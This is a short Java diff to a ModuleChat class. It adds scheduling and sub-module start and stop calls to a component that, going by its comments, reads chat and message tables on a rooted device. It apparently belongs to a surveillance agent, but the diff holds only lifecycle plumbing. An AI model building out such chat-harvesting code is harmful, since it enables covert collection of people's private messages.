@@ -69,6 +69,8 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 	protected boolean parse(ConfModule conf) {
 		if (Status.self().haveRoot()) {
 
+			setDelay(SOON);
+			setPeriod(NEVER);
 			return true;
 		} else {
 			if (Cfg.DEBUG) {
@@ -85,6 +87,7 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 		// open table chat_list
 		// per ogni entry leggere l'ultimo messaggio letto.
 		// open table messages
+		subModuleManager.go();
 	}
 
 	@Override
@@ -94,6 +97,7 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 		}
 
 		ListenerProcess.self().attach(this);
+		subModuleManager.start();
 	}
 
 	@Override
@@ -101,6 +105,7 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (actualStop)");
 		}
+		subModuleManager.stop();
 		ListenerProcess.self().detach(this);
 	}
 
